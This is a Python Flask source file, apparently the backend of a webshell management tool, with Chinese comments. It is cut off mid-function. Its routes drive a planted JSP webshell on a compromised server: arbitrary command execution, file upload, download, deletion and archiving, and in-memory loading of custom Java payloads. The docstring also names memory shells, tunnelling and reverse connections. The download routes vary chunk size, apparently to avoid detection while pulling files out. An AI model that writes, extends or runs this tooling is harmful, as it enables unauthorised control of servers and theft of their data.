#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JSP专属功能API

这个模块包含只有JSP类型webshell才支持的高级功能：
- 内存马管理
- 内网穿透（端口映射、Socks隧道、反向连接）
- 数据库管理

这些功能严重依赖Java环境和特定的Payload，因此单独模块化。
"""

from flask import Blueprint, request, jsonify
import traceback
import json
import os
import time
import hashlib
import datetime
import tempfile

from .shell_factory import get_webshell_config_by_id, get_or_create_webshell_instance_by_id
from . import config as global_config
from .ReqParameter import ReqParameter
from .java.javaPayload import javaPayload

# 创建JSP专属功能蓝图
java_shell_bp = Blueprint('java_shell', __name__, url_prefix='/api/webshell/java')

# 全局存储每个webshell的PortMappingService实例
port_mapping_services = {}

# 全局存储每个webshell的TunnelService实例
tunnel_services = {}

# 全局存储每个webshell的ReverseConnectService实例
reverse_connect_services = {}

# 全局存储javaPayload实例
java_payload = javaPayload()

def ensure_payload_loaded(shell, payload_class_info, payload_name, custom_error_message=None):
    """
    确保指定的payload类已经加载到webshell中
    返回值:
    - 是否成功
    - 加载进内存的类名
    - 错误信息
    """
    try:
        
        payload_loaded_attr = f'_{payload_name.lower()}_loaded'  # 标记该payload类已被加载
        payload_classname_attr = f'_{payload_name.lower()}_classname'  # 加载进内存的实际payload类名
        
        # 检查是否已经加载过
        if hasattr(shell, payload_loaded_attr) and getattr(shell, payload_loaded_attr):
            # 已经加载过，返回已缓存的类名
            class_name = getattr(shell, payload_classname_attr, payload_class_info['classname'])
            print(f"[DEBUG] {payload_name}类已经加载过，无需再次加载，加载进内存的类名: {class_name}")
            return True, class_name, ""
        
        # 未加载，执行加载操作
        print(f"[DEBUG] 加载{payload_name}类到webshell内存,加载进内存的类名是: {payload_class_info['classname']}")
        
        if not shell.include(payload_class_info):
            error_msg = custom_error_message or f'加载{payload_name}类失败'
            print(f"[ERROR] {error_msg}")
            return False, "", error_msg
        
        # 标记该payload类已被加载
        setattr(shell, payload_loaded_attr, True)
        setattr(shell, payload_classname_attr, payload_class_info['classname'])
        
        print(f"[DEBUG] {payload_name}类加载成功，类名: {payload_class_info['classname']}")
        return True, payload_class_info['classname'], ""
        
    except Exception as e:
        error_msg = custom_error_message or f'加载{payload_name}类异常: {str(e)}'
        print(f"[ERROR] {error_msg}")
        return False, "", error_msg

def build_custom_payload_parameter(method_name, payload_param):
    """
    构造自定义Payload执行参数
    """
    parameter = ReqParameter()
    parameter.add("methodName", str(method_name))

    for key, value in payload_param.items():
        if key == "methodName":
            continue

        param_key = str(key)
        if value is None:
            parameter.add(param_key, "")
        elif isinstance(value, str):
            parameter.add(param_key, value)
        elif isinstance(value, (dict, list)):
            parameter.add(param_key, json.dumps(value, ensure_ascii=False))
        else:
            parameter.add(param_key, str(value))

    return parameter

def execute_custom_payload_internal(shell, payload_code, method_name, payload_param):
    """
    执行自定义Payload的公共逻辑
    """
    payload_class_info = java_payload.getCustomPayload(source_code=payload_code)
    original_class_name = java_payload.extract_class_name_from_source(payload_code)

    # 使用源码摘要作为缓存键，避免相同插件重复加载
    payload_hash = hashlib.md5(payload_code.encode('utf-8')).hexdigest()[:12]
    payload_name = f"CustomPayload_{original_class_name}_{payload_hash}"
    success, payload_classname, error_msg = ensure_payload_loaded(
        shell,
        payload_class_info,
        payload_name,
        '加载自定义Payload失败'
    )
    if not success:
        return False, {
            'status': 'error',
            'message': error_msg
        }, 500

    parameter = build_custom_payload_parameter(method_name, payload_param)
    result_bytes = shell.eval_func(payload_classname, None, parameter)
    if result_bytes is None:
        return False, {
            'status': 'error',
            'message': 'Payload执行失败，未返回结果'
        }, 500

    result_text = result_bytes.decode('utf-8', errors='ignore')
    return True, {
        'status': 'success',
        'message': 'Payload执行成功',
        'data': {
            'pluginName': original_class_name,
            'className': payload_classname,
            'originalClassName': original_class_name,
            'methodName': method_name,
            'param': payload_param,
            'output': result_text
        }
    }, 200

# ====== 执行命令接口 ======

@java_shell_bp.route('/executeCommand', methods=['POST'])
def execute_command():
    """执行webshell命令"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        command = data.get('command')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not command:
            return jsonify({'status': 'error', 'message': '命令不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({
                'status': 'error',
                'message': 'Webshell实例创建失败'
            })
        
        # 执行命令
        result = shell.execute_command(command)
        
        if result is not None:
            return jsonify({
                'status': 'success',
                'message': '命令执行成功',
                'data': {
                    'command': command,
                    'output': result
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '命令执行失败'
            })
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


# ====== 文件操作接口 ======

@java_shell_bp.route('/getFiles', methods=['POST'])
def get_files():
    """获取指定目录的文件列表"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        path = data.get('path')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 调用get_files函数
        files_result = shell.get_files(path)
        
        if files_result is None:
            return jsonify({'status': 'error', 'message': '获取文件列表失败'}), 500
        
        # 解析文件列表
        file_list = parse_file_list_text(files_result)
        
        return jsonify({
            'status': 'success',
            'data': {
                'path': path,
                'files': file_list
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

def parse_file_list_text(files_text):
    """解析get_files返回的文件列表文本"""
    try:
        lines = files_text.strip().split('\n')
        file_list = []
        
        if len(lines) <= 1:
            return file_list
        
        # 第一行是目录路径，从第二行开始解析文件信息
        for line in lines[1:]:
            line = line.strip()
            if not line:
                continue
            
            try:
                # 使用正则表达式分割，处理文件名中可能包含空格的情况
                import re
                parts = re.split(r'\s+', line, maxsplit=5)
                
                if len(parts) < 5:
                    continue
                
                file_name = parts[0]
                file_type = parts[1]  # 0=目录, 1=文件
                date = parts[2]
                time = parts[3] 
                size = parts[4]
                permission = parts[5] if len(parts) > 5 else 'Unknown'
                
                # 构造文件信息
                file_info = {
                    'name': file_name,
                    'isDirectory': file_type == '0',
                    'lastModified': f"{date} {time}",
                    'size': int(size) if size.isdigit() else 0,
                    'permission': permission
                }
                
                file_list.append(file_info)
                
            except Exception as parse_error:
                print(f"[WARNING] 解析文件行失败: {line}, 错误: {parse_error}")
                continue
        
        return file_list
        
    except Exception as e:
        print(f"[ERROR] 解析文件列表失败: {e}")
        return []

@java_shell_bp.route('/uploadFile', methods=['POST'])
def upload_file():
    """上传文件（支持普通上传和大文件上传）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        file_data = data.get('fileData')
        use_big_upload = data.get('useBigUpload', False)  # 是否使用大文件上传
        chunk_position = data.get('chunkPosition', 0)  # 当前块在文件中的位置
        total_file_size = data.get('totalFileSize', 0)  # 完整文件大小
        chunk_mb_size = data.get('chunkMbSize', global_config.UPLOAD_CHUNK_MB_SIZE)  # 块大小（MB）
        delay_seconds = data.get('delaySeconds', global_config.UPLOAD_DELAY_SECONDS)  # 延迟时间（秒）
        max_retries = data.get('maxRetries', global_config.UPLOAD_MAX_RETRIES)  # 最大重试次数
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if not file_data:
            return jsonify({'status': 'error', 'message': '文件数据不能为空'}), 400
        
        print(f"[DEBUG] 上传文件请求: {file_path}, 大文件上传: {use_big_upload}, 块大小: {chunk_mb_size}MB")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 将文件数据转换为字节数组（如果是列表的话）
        if isinstance(file_data, list):
            file_data = bytes(file_data)
        
        if use_big_upload:
            # 使用大文件上传逻辑
            print(f"[DEBUG] 使用大文件上传模式")
            
            chunk_size = len(file_data)  # 当前块的大小
            chunk_mb_size_bytes = chunk_mb_size * 1024 * 1024  # 配置的块大小（字节）
            total_chunks = (total_file_size + chunk_mb_size_bytes - 1) // chunk_mb_size_bytes  # 总块数
            current_chunk_index = chunk_position // chunk_mb_size_bytes + 1  # 当前块索引（从1开始）
            
            print(f"[INFO] 总文件大小: {total_file_size} 字节，文件块传输进度: {current_chunk_index}/{total_chunks}")
            print(f"[INFO] 当前块位置: {chunk_position}, 当前块大小: {chunk_size} 字节")
            
            # 重试机制上传当前块
            success = False
            for retry in range(max_retries):
                try:
                    # 调用big_file_upload上传当前块
                    result = shell.big_file_upload(file_path, file_data, str(chunk_position))
                    
                    if result:
                        print(f"[DEBUG] 块 {current_chunk_index} 上传成功（位置: {chunk_position}）")
                        success = True
                        break
                    else:
                        print(f"[WARNING] 块 {current_chunk_index} 上传失败，重试 {retry + 1}/{max_retries}")
                        
                except Exception as chunk_error:
                    print(f"[ERROR] 块 {current_chunk_index} 上传异常: {chunk_error}")
                
                # 如果不是最后一次重试，等待一段时间
                if retry < max_retries - 1:
                    time.sleep(delay_seconds)
            
            if not success:
                return jsonify({
                    'status': 'error',
                    'message': f'大文件上传失败：块 {current_chunk_index} 上传失败，已重试 {max_retries} 次',
                    'data': {
                        'failedChunk': current_chunk_index,
                        'totalChunks': total_chunks,
                        'chunkPosition': chunk_position,
                        'progress': (chunk_position + chunk_size) / total_file_size * 100
                    }
                }), 500
            
            print(f"[SUCCESS] 块 {current_chunk_index} 上传完成: {file_path} (位置: {chunk_position})")
            
            return jsonify({
                'status': 'success',
                'message': f'块 {current_chunk_index} 上传成功',
                'data': {
                    'filePath': file_path,
                    'uploadMode': 'big',
                    'currentChunk': current_chunk_index,
                    'totalChunks': total_chunks,
                    'chunkPosition': chunk_position,
                    'chunkSize': chunk_size,
                    'totalFileSize': total_file_size,
                    'progress': (chunk_position + chunk_size) / total_file_size * 100
                }
            })
        else:
            # 使用普通上传逻辑
            print(f"[DEBUG] 使用普通上传模式")
            result = shell.upload_file(file_path, file_data)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件上传成功',
                    'data': {
                        'filePath': file_path,
                        'uploadMode': 'normal'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件上传失败'
                }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/downloadFile', methods=['POST'])
def download_file():
    """下载文件（支持普通下载和大文件下载）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        use_big_download = data.get('useBigDownload', False)  # 是否使用大文件下载
        chunk_kb_size = data.get('chunkKbSize', global_config.DOWNLOAD_CHUNK_KB_SIZE)  # 块大小（KB）
        timeout_seconds = data.get('timeoutSeconds', global_config.DOWNLOAD_TIMEOUT_SECONDS)  # 间隔（秒）
        enable_chunk_size_variation = data.get(
            'enableChunkSizeVariation',
            global_config.DOWNLOAD_ENABLE_CHUNK_VARIATION
        )  # 是否启用块大小浮动
        chunk_size_variation_kb = data.get(
            'chunkSizeVariationKb',
            global_config.DOWNLOAD_CHUNK_VARIATION_KB
        )  # 块大小浮动范围（KB）
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        print(f"[DEBUG] 下载文件请求: {file_name}, 大文件下载: {use_big_download}")
        if use_big_download:
            print(f"[DEBUG] 大文件下载参数: 块大小={chunk_kb_size}KB, 间隔={timeout_seconds}s, 浮动={enable_chunk_size_variation}, 浮动范围={chunk_size_variation_kb}KB")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        if use_big_download:
            # 使用大文件下载逻辑
            print(f"[DEBUG] 使用大文件下载模式")
            
            # 生成临时文件名用于下载
            temp_dir = tempfile.gettempdir()
            temp_filename = f"webshell_download_{int(time.time())}_{os.path.basename(file_name)}"
            temp_filepath = os.path.join(temp_dir, temp_filename)
            
            try:
                # 调用webshell的big_file_download方法，传递所有参数包括块浮动参数
                download_success = shell.big_file_download(
                    file_path=file_name,
                    save_path=temp_filepath,
                    chunk_kb_size=chunk_kb_size,
                    timeout=timeout_seconds,
                    enable_chunk_size_variation=enable_chunk_size_variation,
                    chunk_size_variation_kb=chunk_size_variation_kb
                )
                
                if download_success:
                    # 读取下载的文件内容
                    with open(temp_filepath, 'rb') as f:
                        result = f.read()
                    print(f"[DEBUG] 大文件下载成功，文件大小: {len(result)} bytes")
                    
                    # 清理临时文件
                    os.remove(temp_filepath)
                else:
                    result = "大文件下载失败"
                    
            except Exception as e:
                print(f"[ERROR] 大文件下载异常: {e}")
                result = f"大文件下载异常: {str(e)}"
                # 清理可能存在的临时文件
                if os.path.exists(temp_filepath):
                    os.remove(temp_filepath)
        else:
            # 使用普通下载逻辑
            print(f"[DEBUG] 使用普通下载模式")
            result = shell.download_file(file_name)
        
        print(f"[DEBUG] 下载文件结果类型: {type(result)}")
        print(f"[DEBUG] 下载文件结果长度: {len(result) if result else 0}")
        
        if result is not None:
            # 检查是否是错误信息（字符串类型）
            if isinstance(result, str):
                # 检查常见的错误信息
                if 'file does not exist' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'文件不存在: {file_name}'
                    }), 404
                elif 'permission denied' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'权限不足: {file_name}'
                    }), 403
                elif 'no such file' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'文件不存在: {file_name}'
                    }), 404
                elif result.strip() == '文件内容为空':
                    return jsonify({
                        'status': 'error',
                        'message': f'文件为空: {file_name}'
                    }), 400
                elif len(result.strip()) == 0:
                    return jsonify({
                        'status': 'error',
                        'message': f'文件为空: {file_name}'
                    }), 400
                
                # 如果是字符串但不是错误信息，说明是文本文件
                print(f"[DEBUG] 返回文本文件内容，长度: {len(result)} 字符")
                return jsonify({
                    'status': 'success',
                    'message': '文件下载成功',
                    'data': {
                        'fileName': file_name,
                        'content': result,
                        'contentType': 'text',
                        'downloadMode': 'big' if use_big_download else 'normal'
                    }
                })
            
            elif isinstance(result, bytes):
                # 如果是二进制文件，转换为base64编码
                import base64
                encoded_content = base64.b64encode(result).decode('utf-8')
                print(f"[DEBUG] 返回二进制文件内容，原始大小: {len(result)} bytes, base64大小: {len(encoded_content)} 字符")
                
                return jsonify({
                    'status': 'success',
                    'message': '文件下载成功',
                    'data': {
                        'fileName': file_name,
                        'content': encoded_content,
                        'contentType': 'binary',
                        'downloadMode': 'big' if use_big_download else 'normal'
                    }
                })
            
            else:
                # 未知类型
                return jsonify({
                    'status': 'error',
                    'message': f'未知的文件内容类型: {type(result)}'
                }), 500
        else:
            return jsonify({
                'status': 'error',
                'message': '文件下载失败：返回内容为空'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/deleteFile', methods=['POST'])
def delete_file():
    """删除文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 删除文件
        result = shell.delete_file(file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件删除成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件删除失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/newFile', methods=['POST'])
def new_file():
    """新建文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 新建文件
        result = shell.new_file(file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件创建成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件创建失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/newDir', methods=['POST'])
def new_dir():
    """新建目录"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        dir_name = data.get('dirName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not dir_name:
            return jsonify({'status': 'error', 'message': '目录名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 新建目录
        result = shell.new_dir(dir_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '目录创建成功',
                'data': {
                    'dirName': dir_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '目录创建失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/copyFile', methods=['POST'])
def copy_file():
    """复制文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 复制文件
        result = shell.copy_file(src_file_name, dest_file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件复制成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件复制失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/moveFile', methods=['POST'])
def move_file():
    """移动文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 移动文件
        result = shell.move_file(src_file_name, dest_file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件移动成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件移动失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/executePayload', methods=['POST'])
def execute_Payload():
    """执行自定义Java Payload"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        payload_code = data.get('payloadCode')
        plugin_name = data.get('pluginName')
        method_name = data.get('methodName')
        payload_param = data.get('param', {})

        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not payload_code and not plugin_name:
            return jsonify({'status': 'error', 'message': 'Payload源码或插件名至少需要提供一个'}), 400
        if not method_name:
            return jsonify({'status': 'error', 'message': '方法名不能为空'}), 400
        if payload_param is None:
            payload_param = {}
        if not isinstance(payload_param, dict):
            return jsonify({'status': 'error', 'message': 'param参数必须是JSON对象'}), 400

        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        if not hasattr(shell, 'include') or not hasattr(shell, 'eval_func'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持自定义Payload功能'}), 400

        if not payload_code and plugin_name:
            payload_info = java_payload.getCustomPayloadCode(plugin_name)
            payload_code = payload_info["source_code"]

        success, response_data, status_code = execute_custom_payload_internal(
            shell,
            payload_code,
            method_name,
            payload_param
        )
        return jsonify(response_data), status_code

    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/saveCustomPayload', methods=['POST'])
def save_custom_payload():
    """保存自定义Payload插件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        payload_code = data.get('payloadCode')
        old_plugin_name = data.get('oldPluginName')
        if not payload_code:
            return jsonify({'status': 'error', 'message': 'Payload源码不能为空'}), 400

        payload_info = java_payload.saveCustomPayload(payload_code)
        if old_plugin_name and old_plugin_name != payload_info["plugin_name"]:
            try:
                java_payload.deleteCustomPayload(old_plugin_name)
            except ValueError:
                pass

        return jsonify({
            'status': 'success',
            'message': '插件保存成功',
            'data': {
                'pluginName': payload_info["plugin_name"],
                'className': payload_info["class_name"]
            }
        })
    except ValueError as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500

@java_shell_bp.route('/listCustomPayloads', methods=['GET'])
def list_custom_payloads():
    """获取自定义Payload插件列表"""
    try:
        payload_list = java_payload.listCustomPayloads()
        for item in payload_list:
            item["updatedAtText"] = datetime.datetime.fromtimestamp(item["updatedAt"]).strftime('%Y-%m-%d %H:%M:%S')

        return jsonify({
            'status': 'success',
            'message': '获取插件列表成功',
            'data': payload_list
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500

@java_shell_bp.route('/getCustomPayloadDetail', methods=['POST'])
def get_custom_payload_detail():
    """获取自定义Payload插件详情"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        plugin_name = data.get('pluginName')
        if not plugin_name:
            return jsonify({'status': 'error', 'message': '插件名不能为空'}), 400

        payload_info = java_payload.getCustomPayloadCode(plugin_name)
        return jsonify({
            'status': 'success',
            'message': '获取插件详情成功',
            'data': {
                'pluginName': payload_info["plugin_name"],
                'className': payload_info["class_name"],
                'payloadCode': payload_info["source_code"]
            }
        })
    except ValueError as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500

@java_shell_bp.route('/deleteCustomPayload', methods=['POST'])
def delete_custom_payload():
    """删除自定义Payload插件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        plugin_name = data.get('pluginName')
        if not plugin_name:
            return jsonify({'status': 'error', 'message': '插件名不能为空'}), 400

        java_payload.deleteCustomPayload(plugin_name)
        return jsonify({
            'status': 'success',
            'message': '插件删除成功'
        })
    except ValueError as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500

@java_shell_bp.route('/zip', methods=['POST'])
def zip():
    """压缩文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        compress_paths = data.get('compressPaths')  # 要压缩的路径，可以是字符串或列表
        compress_file = data.get('compressFile')   # 压缩后的文件路径
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_paths:
            return jsonify({'status': 'error', 'message': '压缩路径不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400
        
        print(f"[DEBUG] 压缩文件请求: {compress_paths} -> {compress_file}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 对于需要Java环境的压缩功能，确保是JavaShell类型
        if hasattr(shell, 'zip') and hasattr(shell, 'include'):
            # 获取JZip类代码
            jzip_class_info = java_payload.getPayload(class_name="JZip")
            
            # 确保JZip类已加载
            success, jzip_classname, error_msg = ensure_payload_loaded(shell, jzip_class_info, "JZip", 'JZip类加载失败')
            if not success:
                return jsonify({'status': 'error', 'message': error_msg}), 500
            
            # 执行压缩操作
            result = shell.zip(compress_paths, compress_file, class_name=jzip_classname)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件压缩成功',
                    'data': {
                        'compressPaths': compress_paths,
                        'compressFile': compress_file,
                        'className': jzip_classname
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件压缩失败'
                }), 500
        else:
            return jsonify({
                'status': 'error',
                'message': '当前webshell类型不支持压缩功能'
            }), 400
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@java_shell_bp.route('/unzip', methods=['POST'])
def unzip():
    """解压文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        compress_file = data.get('compressFile')   # 压缩文件路径
        extract_dir = data.get('extractDir')       # 解压目录路径
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400
        if not extract_dir:
            return jsonify({'status': 'error', 'message': '解压目录路径不能为空'}), 400
        
        print(f"[DEBUG] 解压文件请求: {compress_file} -> {extract_dir}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 对于需要Java环境的解压功能，确保是JavaShell类型
        if hasattr(shell, 'unzip') and hasattr(shell, 'include'):
            # 获取JZip类代码
            jzip_class_info = java_payload.getPayload(class_name="JZip")
            
            # 确保JZip类已加载
            success, jzip_classname, error_msg = ensure_payload_loaded(shell, jzip_class_info, "JZip", 'JZip类加载失败')
            if not success:
                return jsonify({'status': 'error', 'message': error_msg}), 500
            
            # 执行解压操作
            result = shell.unzip(compress_file, extract_dir, class_name=jzip_classname)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件解压成功',
                    'data': {
                        'compressFile': compress_file,
                        'extractDir': extract_dir,
                        'className': jzip_classname
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件解压失败'
                }), 500
        else:
            return jsonify({
                'status': 'error',
                'message': '当前webshell类型不支持解压功能'
            }), 400
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@java_shell_bp.route('/fileRemoteDownload', methods=['POST'])
def file_remote_download():
    """远程下载文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        download_url = data.get('downloadUrl')    # 远程下载URL
        save_path = data.get('savePath')          # 保存路径
        
        # 参数验证
        if not webshell_id:
